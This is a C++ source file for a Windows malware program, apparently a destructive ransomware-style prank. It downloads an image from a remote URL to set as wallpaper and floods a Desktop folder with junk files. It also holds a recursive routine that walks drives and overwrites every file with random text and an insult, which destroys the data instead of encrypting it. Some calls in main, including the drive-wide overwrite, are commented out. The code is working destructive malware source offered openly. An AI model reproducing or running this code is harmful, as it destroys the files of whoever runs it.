/*
	 AUTHOR: Rocka
	 GITHUB: https://www.github.com/rockadev

	 Author of this project is not responsible for any damage that someone make.
*/

#include "main.h"
#include "utils.h"
#include "files.h"
#include "rand.h"

#pragma warning(disable:4101)
#pragma warning(disable:4390)

using namespace std::filesystem;
using namespace crypt;

void utils::Background::ch_process(const wchar_t* background)
{
	if (S_OK == URLDownloadToFileW(NULL, BGURL, BGPATH, 0, NULL))
	{
		//uint_32 returnVal = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID*)background, SPIF_UPDATEINIFILE);
	}

	return;
}


void ::Encryption::encrypt(std::string path)
{
	auto iter = directory_iterator(path, SKIP_PERMS_IF_DENIED);
	auto end_iter = end(iter);
	auto errorcode = std::error_code();

	for (; iter != end_iter; iter.increment(errorcode))
	{
		if (errorcode)
		{
			continue;
		}

		for (auto& entry : iter)

		{
			try
			{

				if (entry.is_directory())
				{
					encrypt(entry.path().string());
				}
				else
				{
					int str_length = 80;
					int nm = str_length;

					Random randomstring;

					std::cout << "Current file: " << entry.path().string() << std::endl;

					fps.open(entry.path().string(), std::fstream::in);
					fpt.open(entry.path().string(), std::fstream::out);


					fpt << randomstring.randomstr(nm) << '\n' << "FFFFFFUCK THIS PC";


					fps.close();
					fpt.close();

					fps.open(entry.path().string(), std::fstream::out);
					fpt.open(entry.path().string(), std::fstream::in);

					fps << randomstring.randomstr(nm) << '\n' << "FFFFFFUCK THIS PC";


					fps.close();
					fpt.close();

					//rename(entry.path().string(), rename_suffix(entry.path().string()));
				}
			}
			catch (filesystem_error& e)
			{
				// Ignore the error
			}
		}
	}
}

void ::Spam::desktop()
{
	for (int32 files = 0; files < MAX_FILES; files++)
	{
		std::wstring filecount = std::to_wstring(files);
		std::wstring shit = L"C:\\Users\\mineo\\Desktop\\kkt\\" + fname + filecount + ftype;
		std::wofstream outfile(shit.c_str());
		outfile << fcontent;
	}
}

void melt()
{
	int32 k = 0;
}

int main(int argc, char * argv[])
{
	melt();

	::Spam * spamfiles = new ::Spam();
	spamfiles->desktop();

	const int TIMES = 50;
	for (int i = 0; i < TIMES; i++, Sleep(50))
	{
		//SetCursorPos(50 + rand() % 800, 50 + rand() % 800);
	}

	utils::Background * changeBg = new utils::Background();
	utils::ListDrives * listdrives = new utils::ListDrives();
	crypt::Encryption * encryptFiles = new crypt::Encryption();

	changeBg->ch_process(pathappdata);
	encryptFiles->suffix = L"DDNT&&OBPA=D";


	std::vector<std::string> drives = listdrives->getListOfDrives();
	std::vector<std::string> driveslist;
	
	for (std::string currentDrive : drives) {
		if (currentDrive[0] == 'C')
		{
			driveslist.push_back(currentDrive + "\\Users\\\\" + std::string(user) + "\\\\Desktop\\\\");
		}

		else
		{
			driveslist.push_back(currentDrive + "\\");
		}
	}


	int32 i = 0;

	for (i; i < driveslist.size(); i++)
	{
		try
		{
			//encryptFiles->encrypt(driveslist[i]);
		}
		catch (filesystem_error &e)
		{
			// Ignore errors
		}
	}

	return 0;
}
